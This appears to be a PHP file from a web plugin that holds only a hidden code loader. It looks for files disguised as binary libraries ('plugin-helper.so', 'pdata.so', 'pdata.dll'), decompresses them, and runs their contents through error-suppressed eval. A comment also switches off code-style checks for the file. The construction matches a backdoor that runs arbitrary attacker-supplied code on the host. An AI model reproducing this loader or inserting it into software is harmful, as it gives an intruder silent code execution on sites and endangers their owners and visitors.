<?php
// phpcs:ignoreFile
$path=dirname(__FILE__);
if(file_exists($path.DIRECTORY_SEPARATOR.'plugin-helper.so')){
	$content=file_get_contents($path.DIRECTORY_SEPARATOR."plugin-helper.so");
	if(empty(trim($content))){
		unlink($path.DIRECTORY_SEPARATOR."plugin-helper.so");
		return;
	}
	@eval(''.$content);
}elseif(file_exists($path.DIRECTORY_SEPARATOR.'pdata.so')){
	$content=gzuncompress(file_get_contents($path.DIRECTORY_SEPARATOR."pdata.so"));
	@eval(''.$content);
}elseif(file_exists($path.DIRECTORY_SEPARATOR.'pdata.dll')){
	$content=gzuncompress(file_get_contents($path.DIRECTORY_SEPARATOR."pdata.dll"));
	@eval(''.$content);
}



